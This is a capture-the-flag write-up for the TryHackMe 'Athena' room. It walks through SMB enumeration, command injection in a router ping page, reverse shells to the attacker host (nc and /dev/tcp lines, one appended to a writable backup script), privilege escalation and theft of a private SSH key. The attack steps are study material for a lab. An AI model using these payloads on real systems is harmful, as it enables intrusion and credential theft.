<h1 align="center">Athena</h1>
<p align="center">2025, August 10<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>461</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Break all security and compromise the machine.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/ed6cda93-a786-4651-abbd-6147aa2a1d02"><br>
Access the CTF<a href="https://tryhackme.com/room/4th3n4">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/ad972fbe-aeb4-473c-96ee-26b0a9070b49"></p>

<br>
<br>

<h2>Task 1 . Athena</h2>
<p>Are you capable of mastering the entire system and exploiting all vulnerabilities?<br>

Note: Please allow the machine 2 - 3 minutes to fully boot.</p>

<p><em>Answer the questions below</em></p>

<br>

<h3>nmap</h3>

```bash
:~/Athena# nmap -sT -T4 TargetIP
...
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```bash
:~/Athena# nmap -sC -sV -p- -T4 TargetIP
...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Athena - Gods of olympus
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
...
Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: ROUTERPANEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-xxTxx:xx:xx
|_  start_date: N/A
```

<br>

<h3>Web 80</h3>

<img width="1326" height="692" alt="image" src="https://github.com/user-attachments/assets/876395a6-6380-49ba-bf50-69cb93da3046" />

```bash
<!DOCTYPE html>
<html>
  <head>
    <title>Athena - Gods of olympus</title>
    <meta name="description" content="Page about Athena, the Greek goddess of wisdom, war strategy and the arts.">
    <meta name="author" content="matheuz">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <header>
      <nav>
        <ul>
          <li><a href="#">Home</a></li>
          <li><a href="#">About</a></li>
          <li><a href="#">Contact</a></li>
        </ul>
      </nav>
      <h1>Athena - Gods of Olympus</h1>
      <p class="subtitle">The Greek goddess of wisdom, war strategy and the arts</p>
    </header>
    <main>
      <section>
        <h2>Who is Athena?</h2>
        <p>Athena is the daughter of Zeus and the goddess Metis, who was swallowed by Zeus when she was pregnant. Athena was born from the head of Zeus, fully armed and adult. She is the goddess of wisdom, war strategy and the arts. She is often portrayed with an owl, which symbolizes wisdom, on her shoulder.</p>
      </section>
      <section>
        <h2>Athena and Greek Mythology</h2>
        <p>In addition to being the goddess of wisdom, Athena is known for helping Greek heroes in their battles against monsters and other mythological creatures. She was also one of the most important designees for the city of Athens, which was named after the goddess.</p>
        <img src="athena.jpg" alt="Athena">
      </section>
    </main>
  </body>
</html>
```


<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/6123d0ea-50a9-41b3-b7cb-30c8b26a4798"></p>

<br>

<h3>enum4linux</h3>

<p>

  
- //10.201.26.189/public	Mapping: OK, Listing: OK</p>


```bash
:~/Athena# enum4linux xx.xxx.xx.xxx
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Aug  5 19:28:50 2025

 ========================== 
|    Target Information    |
 ========================== 
Target ........... xx.xxx.xx.xxx
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on xx.xxx.xx.xxx    |
 ===================================================== 
[+] Got domain/workgroup name: SAMBA

 ============================================= 
|    Nbtstat Information for xx.xxx.xx.xxx    |
 ============================================= 
Looking up status of xx.xxx.xx.xxx
	ROUTERPANEL     <00> -         B <ACTIVE>  Workstation Service
	ROUTERPANEL     <03> -         B <ACTIVE>  Messenger Service
	ROUTERPANEL     <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	SAMBA           <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	SAMBA           <1d> -         B <ACTIVE>  Master Browser
	SAMBA           <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on xx.xxx.xx.xxx    |
 ====================================== 
[+] Server xx.xxx.xx.xxx allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for xx.xxx.xx.xxx    |
 ============================================ 
Domain Name: SAMBA
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on xx.xxx.xx.xxx    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for xx.xxx.xx.xxx from smbclient: 
[+] Got OS info for xx.xxx.xx.xxx from srvinfo:
	ROUTERPANEL    Wk Sv PrQ Unx NT SNT Samba 4.15.13-Ubuntu
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on xx.xxx.xx.xxx    |
 ============================== 
Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 876.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 879.

Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 892.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 894.

 ========================================== 
|    Share Enumeration on xx.xxx.xx.xxx    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	public          Disk      
	IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on xx.xxx.xx.xxx
//xx.xxx.xx.xxx/public	Mapping: OK, Listing: OK
//xx.xxx.xx.xxx/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for xx.xxx.xx.xxx    |
 ===================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 =============================== 
|    Groups on xx.xxx.xx.xxx    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on xx.xxx.xx.xxx via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1444009243-207373887-3299893081
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
...
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
...
[+] Enumerating users using SID S-1-5-21-1444009243-207373887-3299893081 and logon username '', password ''
...
S-1-5-21-1444009243-207373887-3299893081-501 ROUTERPANEL\nobody (Local User)
...
S-1-5-21-1444009243-207373887-3299893081-513 ROUTERPANEL\None (Domain Group)
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\ubuntu (Local User)
S-1-22-1-1001 Unix User\athena (Local User)
```

<br>

<h3>smbclient</h3>


```bash
:~/Athena# smbclient //xx.xxx.xx.xxx/public
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 17 01:54:43 2023
  ..                                  D        0  Mon Apr 17 01:54:05 2023
  msg_for_administrator.txt           N      253  Sun Apr 16 19:59:44 2023

		19947120 blocks of size 1024. 9693376 blocks available
smb: \> get msg_for_administrator.txt
getting file \msg_for_administrator.txt of size 253 as msg_for_administrator.txt (2.5 KiloBytes/sec) (average 2.5 KiloBytes/sec)
smb: \> exit
```

<h3>msg_for_Administrator.txt</h3>
<p>

- /myrouterpanel</p>

```bash
:~/Athena# cat msg_for_administrator.txt

Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```
<br>

<h3>/myrouterpanel</h3>

<img width="1324" height="399" alt="image" src="https://github.com/user-attachments/assets/f94c25c0-d552-412c-b6b4-66792f7210d6" />


<img width="1320" height="256" alt="image" src="https://github.com/user-attachments/assets/538bf4d0-a48d-479a-9920-03c0d2ecb8aa" />

<p>AttackIP</p>

```bash
:~/Athena# sudo tcpdump -i ens5 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
xx:xx:xx.017739 IP ip-xx-xxx-xx-xxx.ec2.internal > ip-xx-xxx-xxx-xxx.ec2.internal: ICMP echo request, id 1, seq 1, length 64
xx:xx:xx.017802 IP ip-xx-xxx-xx-xxx.ec2.internal > ip-xx-xxx-xxx-xxx.ec2.internal: ICMP echo reply, id 1, seq 1, length 64
xx:xx:xx.035215 IP ip-xx-xxx-xx-xxx.ec2.internal > iip-xx-xxx-xxx-xxx.ec2.internal: ICMP echo request, id 1, seq 2, length 64
xx:xx:xx.035248 IP ip-xx-xxx-xx-xxx.ec2.internal > ip-xx-xxx-xxx-xxx.ec2.internal: ICMP echo reply, id 1, seq 2, length 64
xx:xx:xx.059202 IP ip-xx-xxx-xx-xxx.ec2.internal > ip-xx-xxx-xxx-xxx.ec2.internal: ICMP echo request, id 1, seq 3, length 64
xx:xx:xx.059230 IP ip-xx-xxx-xx-xxx.ec2.internal > ip-xx-xxx-xxx-xxx.ec2.internal: ICMP echo reply, id 1, seq 3, length 64
xx:xx:xx.083230 IP ip-xx-xxx-xx-xxx.ec2.internal > ip-xx-xxx-xxx-xxx.ec2.internal: ICMP echo request, id 1, seq 4, length 64
xx:xx:xx.083260 IP ip-xx-xxx-xx-xxx.ec2.internal > ip-xx-xxx-xxx-xxx.ec2.internal: ICMP echo reply, id 1, seq 4, length 64
xx:xx:xx.163929 IP ip-xx-xxx-xx-xxx.ec2.internal > scanner-011.ch1.censys-scanner.com: ICMP ip-xx-xxx-xxx-xxx.ec2.internal udp port 1261 unreachable, length 64
xx:xx:xx.710504 IP ip-xx-xxx-xx-xxx.ec2.internal > xxx.xxx.xxx.xxx.bc.googleusercontent.com: ICMP ip-xx-xxx-xxx-xxx.ec2.internal udp port 1137 unreachable, length 86
^C
10 packets captured
10 packets received by filter
0 packets dropped by kernel
```

<p>127.0.0.1</p>

<img width="1060" height="203" alt="image" src="https://github.com/user-attachments/assets/e4406042-acdc-4206-896f-f9567081fcba" />

<br>
<h3>Burp Suite and FoxyProxy</h3>

<img width="721" height="323" alt="image" src="https://github.com/user-attachments/assets/50cbdb56-e078-46fc-b8ef-39f76d9e1874" />

<br>
<h3>Command Injection Wordlist</h3>
<p>https://github.com/payloadbox/command-injection-payload-list</p>

<img width="977" height="318" alt="image" src="https://github.com/user-attachments/assets/31c926ff-2900-4046-bb70-940655b25fa0" />


```bash
:~/Athena# head wordlist.txt
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
/index.html|id|
;id;
;id
;netstat -a;
;system('cat%20/etc/passwd')
;id;
```

<br>
<h3>Burp Suite Intruder</h3>

<img width="721" height="363" alt="image" src="https://github.com/user-attachments/assets/3988fb2d-249b-49f6-a67a-d3faa824cce7" />


<img width="1177" height="466" alt="image" src="https://github.com/user-attachments/assets/9b23234e-4724-4d0f-b4d2-0e86f225594b" />

<p>ip=127.0.0.1%0Acat%20%2fetc%2fpasswd&submit=</p>

<p>

- root:x:0:0:root:/root:/bin/bash<br>
- ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash<br>
- athena:x:1001:1001::/home/athena:/bin/bash</p>


<p><em>Request</em></p>

```bash
POST /myrouterpanel/ping.php HTTP/1.1
...

ip=127.0.0.1%0Acat%20%2fetc%2fpasswd&submit=
```

<p><em>Response</em></p>

```bash
HTTP/1.1 200 OK
Date: Tue, xx Aug 2025 xx:xx:xx GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 3409
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.031 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.034 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3071ms
rtt min/avg/max/mdev = 0.022/0.030/0.034/0.004 ms
root:x:0:0:root:/root:/bin/bash
...
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
...
athena:x:1001:1001::/home/athena:/bin/bash
```

<p>
  
- ip=127.0.0.1%0A%2fusr%2fbin%2fid&submit=<br>
- ip=127.0.0.1%0Aid&submit=<br>
- ip=127.0.0.1%0Aid%0A&submit=<br>
- ip=127.0.0.1%0A%2fusr%2fbin%2fid%0A&submit=<br><br>

- uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>

```bash
HTTP/1.1 200 OK
Date: Tue, 05 Aug 2025 xx:xx:xx GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 490
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.031 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.035 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3078ms
rtt min/avg/max/mdev = 0.023/0.030/0.035/0.004 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

<br>

<h3>CyberChef</h3>

<p>

- URL Decode</p>

<img width="1227" height="251" alt="image" src="https://github.com/user-attachments/assets/12865395-a894-4986-b87b-3df2fc0387f2" />

<p>

- <code>ls -lah /home</code> = <code>ls%20-lah%20/home</code></p>

<img width="1229" height="156" alt="image" src="https://github.com/user-attachments/assets/fd7ac812-31f8-49aa-9065-3c6fc9a42354" />


<p>

- athena<br>
- ubuntu</p>

<img width="848" height="330" alt="image" src="https://github.com/user-attachments/assets/38312f7d-a93c-4f3d-906e-d2917f0d54da" />


<p>

- <code>ls -lah /home/athena</code< = <code>ls%20-lah%20/home/athena</code></p>

<img width="898" height="272" alt="image" src="https://github.com/user-attachments/assets/4fa0d50f-9086-4b94-a7dd-a709252b3462" />


<br>

<h3>Reverse Shell Generator</h3>

<img width="1280" height="468" alt="image" src="https://github.com/user-attachments/assets/fa910fd1-821b-46a2-8842-96de6f5e7ccb" />

<br>

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc xx.xxx.xxx.xxx 4444 >/tmp/f
```

<br>

<h3>CyberChef</h3>

<img width="1317" height="201" alt="image" src="https://github.com/user-attachments/assets/c6a03ef6-6aa0-404a-9600-6f5d3274fe67" />

<br>

```bash
rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/bash%20-i%202%3E&1%7Cnc%20xx.xxx.xxx.xxx%204444%20%3E/tmp/f
```

<br>

<h3>Burp Repeater</h3>

<img width="866" height="275" alt="image" src="https://github.com/user-attachments/assets/a0176964-5c47-4b0f-8876-44785dd50f41" />

<br>

<h3>CyberChef</h3>

<img width="1310" height="196" alt="image" src="https://github.com/user-attachments/assets/45a8affe-fe7e-43f2-a9e2-585960133a15" />

```bash
nc xx.xxx.xxx.xxx 4444 -e /bin/bash
```

```bash
nc%20xx.xxx.xxx.xxx%204444%20-e%20/bin/bash
```

<br>
<h3>Burp Repeater</h3>

<img width="419" height="269" alt="image" src="https://github.com/user-attachments/assets/f64afc8f-b611-44df-b1b8-06537a52f212" />

<br>
<br>

<h3>Shell</h3>

<img width="901" height="326" alt="image" src="https://github.com/user-attachments/assets/8cad0f53-1559-4f33-bbcb-da72fba678f0" />


```bash
:~/Athena# nc -nlvp 4444
Listening on 0.0.0.0 4444
...
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@routerpanel:/var/www/html/myrouterpanel$ export TERM=xterm^Z
[1]+  Stopped                 nc -nlvp 4444
:~/Athena# stty -echo raw;fg
nc -nlvp 4444

www-data@routerpanel:/var/www/html/myrouterpanel$ 
```

<br>

<h3>ping.php</h3>

```bash
www-data@routerpanel:/var/www/html/myrouterpanel$ ls -lah
total 24K
drwxr-xr-x 2 root root 4.0K May 23  2023 .
drwxr-xr-x 3 root root 4.0K Apr 19  2023 ..
-rw-r--r-- 1 root root 1.3K Apr 16  2023 index.html
-rw-r--r-- 1 root root  767 May 23  2023 ping.php
-rw-r--r-- 1 root root 1.3K Apr 16  2023 style.css
-rw-r--r-- 1 root root  211 Apr 15  2023 under-construction.html
```

<br>

```bash
www-data@routerpanel:/var/www/html/myrouterpanel$ cat ping.php
<?php
if (isset($_POST['submit'])) {
    $host = $_POST['ip'];

    // Validate input
    if (containsMaliciousCharacters($host)) {
        echo "Attempt hacking!";
        exit;
    }

    // Execute command safely
    $cmd = "ping -c 4 " . $host;
    $output = shell_exec($cmd);

    if (!$output) {
        echo "Failed to execute ping.";
        exit;
    }

    echo "<pre>" . $output . "</pre>";
}

function containsMaliciousCharacters($input) {
    // Define the set of characters to check for
    $maliciousChars = array(';', '&', '|');

    // Check if any of the malicious characters exist in the input
    foreach ($maliciousChars as $char) {
        if (stripos($input, $char) !== false) {
            return true;
        }
    }

    return false;
}
?>
```

<br>
<h3>/home</h3>

```bash
www-data@routerpanel:/var/www/html/myrouterpanel$ cd /home
www-data@routerpanel:/home$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Apr 16  2023 .
drwxr-xr-x 20 root   root   4096 Apr 16  2023 ..
drwx------ 17 athena athena 4096 Jul 31  2023 athena
drwx------ 15 ubuntu ubuntu 4096 May 23  2023 ubuntu
```

<br>
<h3><code>athena</code> and <code>ubuntu</code> = Permission denied</h3>

```bash
www-data@routerpanel:/home$ cd athena
bash: cd: athena: Permission denied
```

```bash
www-data@routerpanel:/home$ cd ubuntu
bash: cd: ubuntu: Permission denied
```

<br>
<h3>linpeas.sh</h3>

```bash
:~/Athena# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<br>

```bash
www-data@routerpanel:/dev/shm$ wget http://xx.xxx.xxx.xxx:8000/linpeas.sh
...
linpeas.sh          100%[===================>] 227.91K  --.-KB/s    in 0.001s  
```

<br>

```bash
www-data@routerpanel:/dev/shm$ chmod +x linpeas.sh
```

<br>

```bash
www-data@routerpanel:/dev/shm$ ./linpeas.sh
```

<br>

<img width="802" height="559" alt="image" src="https://github.com/user-attachments/assets/0ef127f8-19c4-4134-8765-fce235ed2101" />

<br>
<br>

<p>

- Interesting writable files owned by me or writable by everyone (not in Home) > <code>/usr/share/backup/backup.sh</code></p>

```bash
...
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/snap/core22/634/usr/bin/ping = cap_net_raw+ep
/snap/core22/817/usr/bin/ping = cap_net_raw+ep
/snap/core20/1891/usr/bin/ping = cap_net_raw+ep
/snap/core20/1974/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
...
[+] Backup files?
-rwxr-xr-x 1 root root 3983 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/48x48/slbackup-php_web-browser.png
-rwxr-xr-x 1 root root 4189 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/48x48/kbackup_kbackup.png
-rwxr-xr-x 1 root root 1665 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/48x48/kup-backup_kup.png
-rwxr-xr-x 1 root root 6785 Apr 24  2018 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/luckybackup_luckybackup.png
-rwxr-xr-x 1 root root 6035 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/slbackup-php_web-browser.png
-rwxr-xr-x 1 root root 5509 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/kbackup_kbackup.png
-rwxr-xr-x 1 root root 2168 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/kup-backup_kup.png
-rw-r--r-- 1 root root 191 Mar 16  2023 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 10151 Mar 16  2023 /etc/xml/docbook-xml.xml.old
-rw-r--r-- 1 root root 1219 Mar 16  2023 /etc/xml/sgml-data.xml.old
-rw-r--r-- 1 root root 3210 Mar 16  2023 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Mar 16  2023 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 192 May 26  2023 /etc/systemd/system/athena_backup.service
-rw-r--r-- 1 root root 3158 Apr 16  2023 /etc/apt/sources.bak
-rwxr-xr-x 1 root root 14648 Feb 23  2023 /usr/bin/tdbbackup.tdbtools
...
[+] Searching tables inside readable .db/.sqlite files (limit 100)
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)

 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)

 -> Extracting tables from /var/lib/colord/storage.db (limit 20)

 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)

 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)

 -> Extracting tables from /var/lib/gdm3/.cache/tracker/meta.db (limit 20)
....
[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/dev/shm/linpeas.sh
/run/lock
/run/lock/apache2
/snap/core20/1891/run/lock
/snap/core20/1891/tmp
/snap/core20/1891/var/tmp
/snap/core20/1974/run/lock
/snap/core20/1974/tmp
/snap/core20/1974/var/tmp
/snap/core22/634/run/lock
/snap/core22/634/tmp
/snap/core22/634/var/tmp
/snap/core22/817/run/lock
/snap/core22/817/tmp
/snap/core22/817/var/tmp
/tmp
/usr/share/backup/backup.sh
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/BrlAPI
/var/lib/php/sessions
/var/metrics
/var/spool/samba
/var/tmp
...
```

<br>

<p>

- <code>/usr/share/backup/backup.shM/code></p>


```bash
www-data@routerpanel:/var/www/html/myrouterpanel$ find / -name backup* 2>&1 | grep -v 'Permission denied' 
...
/var/backups
/usr/share/help/C/gnome-help/backup-restore.page
/usr/share/help/C/gnome-help/backup-what.page
/usr/share/help/C/gnome-help/backup-thinkabout.page
/usr/share/help/C/gnome-help/backup-why.page
/usr/share/help/C/gnome-help/backup-where.page
/usr/share/help/C/gnome-help/backup-frequency.page
/usr/share/help/C/gnome-help/backup-check.page
/usr/share/help/C/gnome-help/backup-how.page
/usr/share/backup
/usr/share/backup/backup.sh
/usr/share/help-langpack/en_GB/deja-dup/backup-first.page
/usr/share/help-langpack/en_GB/deja-dup/backup-auto.page
/usr/share/help-langpack/en_GB/evolution/backup-restore.page
/usr/share/help-langpack/en_AU/deja-dup/backup-first.page
/usr/share/help-langpack/en_AU/deja-dup/backup-auto.page
/usr/share/icons/Yaru/16x16/apps/backups-app.png
/usr/share/icons/Yaru/scalable/apps/backups-app-symbolic.svg
/usr/share/icons/Yaru/256x256@2x/apps/backups-app.png
/usr/share/icons/Yaru/48x48@2x/apps/backups-app.png
/usr/share/icons/Yaru/32x32@2x/apps/backups-app.png
/usr/share/icons/Yaru/256x256/apps/backups-app.png
/usr/share/icons/Yaru/24x24/apps/backups-app.png
/usr/share/icons/Yaru/24x24@2x/apps/backups-app.png
/usr/share/icons/Yaru/48x48/apps/backups-app.png
/usr/share/icons/Yaru/32x32/apps/backups-app.png
/usr/share/icons/Yaru/16x16@2x/apps/backups-app.png
```

<br>


```bash
www-data@routerpanel:/usr/share/backup$ ls -la
total 20
drwxr-xr-x   2 athena   www-data  4096 May 28  2023 .
drwxr-xr-x 236 root     root     12288 May 26  2023 ..
-rwxr-xr-x   1 www-data athena     258 May 28  2023 backup.sh
```

<br>
<h3>backup.sh</h3>

```bash
www-data@routerpanel:/usr/share/backup$ cat backup.sh
#!/bin/bash

backup_dir_zip=~/backup

mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"

zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo "Backup completed..."
```

<br>

```bash
www-data@routerpanel:/usr/share/backup$ echo "bash -i >& /dev/tcp/xx.xxx.xxx.xxx/4445 0>&1" >> backup.sh
```

<br>

```bash
:~/Athena# nc -nlvp 4445
...
athena@routerpanel: cat /home/athena/user.txt
********************e45eb3e1a28
```

<br>

<p>1.1. What is the user flag?<br>
<code>********************e45eb3e1a28</code></p>

<br>
<h3>id_rsa</h3>

```bash
athena@routerpanel:~/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAufM6pX6tSPERxcs9UwG/lESWYqFL3Abbsii1gD/vpbokS9VE+Pgh
JUhBwq+RsjTsiFRrUwLuKLOE7yuzwgpKxZjMoGKB76/vF9pIcfth1OpIYIk85zOrhmpA7h
...
```

<br>

```bash
:~/Athena#nano id_rsa
:~/Athena#chmod 600 id_rsa
```

<br>
<h3>id_rsa.pub</h3>

```bash
athena@routerpanel:~/.ssh$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc***********************************TAb+URJZioUvcBtuyKLWAP++luiRL1UT4+CElSEHCr5GyNOyIVGtTAu4os4TvK7PCCkrFmMygYoHvr+8X2khx+2HU6khgiTznM6uGakDuHhVCBf83aiRdcgk9Lh7TOsWi4drbqngFMzA/ecM7EvkkneygPnURBqb46T4jVubEBjahHbwBSPm1shC6/nAcJ9dmOsRIbf/VJy6aXkV/K87RzePz8Fqb485UjTM0G2jhq4KbcWM6xLQoEB6P2FrRnNh8ItDbmcK+G35n16Hr/KyT8BD0H4vbVQRzwTGYr6kJxUtSwO/VBE0QifEzkOaRkSLvRdBErRFqJ6yHeaDiG2SVsT0Q3rmpqc3Og8dHAEhEYokbeI/Ftl5yGvPVgZ4Bzpsve+4mvgk9wksBMMUiim0KqZe70N2oQwu1cBNGd7y+g9YI5N8JfcCW28Jks2rJ0i/3HjlYKVJGpuISwDSJwaYiGjF9551B+C1LvWdRUeaUpxm0h60= athena@routerpanel
<waYiGjF9551B+C1LvWdRUeaUpxm0h60= athena@routerpanel
```

<br>

```bash
athena@routerpanel:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc***********************************TAb+URJZioUvcBtuyKLWAP++luiRL1UT4+CElSEHCr5GyNOyIVGtTAu4os4TvK7PCCkrFmMygYoHvr+8X2khx+2HU6khgiTznM6uGakDuHhVCBf83aiRdcgk9Lh7TOsWi4drbqngFMzA/ecM7EvkkneygPnURBqb46T4jVubEBjahHbwBSPm1shC6/nAcJ9dmOsRIbf/VJy6aXkV/K87RzePz8Fqb485UjTM0G2jhq4KbcWM6xLQoEB6P2FrRnNh8ItDbmcK+G35n16Hr/KyT8BD0H4vbVQRzwTGYr6kJxUtSwO/VBE0QifEzkOaRkSLvRdBErRFqJ6yHeaDiG2SVsT0Q3rmpqc3Og8dHAEhEYokbeI/Ftl5yGvPVgZ4Bzpsve+4mvgk9wksBMMUiim0KqZe70N2oQwu1cBNGd7y+g9YI5N8JfcCW28Jks2rJ0i/3HjlYKVJGpuISwDSJwaYiGjF9551B+C1LvWdRUeaUpxm0h60= athena@routerpanel
<waYiGjF9551B+C1LvWdRUeaUpxm0h60= athena@routerpanel' > authorized_keys
```

<br>
<h3>SSH</h3>

```bash
:~/Athena# ssh -i id_rsa athena@xx.xxx.xxx.xx
...
athena@routerpanel:~$
```

